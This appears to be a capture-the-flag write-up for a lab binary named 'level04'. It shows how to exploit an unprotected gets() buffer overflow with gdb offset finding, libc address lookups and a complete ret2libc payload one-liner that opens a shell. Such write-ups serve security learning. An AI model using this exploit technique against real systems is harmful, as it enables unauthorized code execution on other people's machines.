The program uses a non protected gets() so it's going to be a buffer overflow attack.
We need to find the EIP offset but the program uses a fork:

we have to set follow-fork-mode child in gdb to debug the child process.
and to get the offset:
(gdb) r < <(echo "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")

the offset found is 0x41326641 = 156

we can't make syscall so let's do a ret2lib attack, we have to retrieve the address of the system, exit function and /bin/sh address:

(gdb) info function system
[...]
0xf7e6aed0 system

(gdb) info function exit
[...]
0xf7e5eb70 exit

(gdb) find 0xf7e2c000,0xf7fd0000,"/bin/sh"
0xf7f897ec

(python -c 'print "A" \* 156 + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-1]'; cat) | ./level04
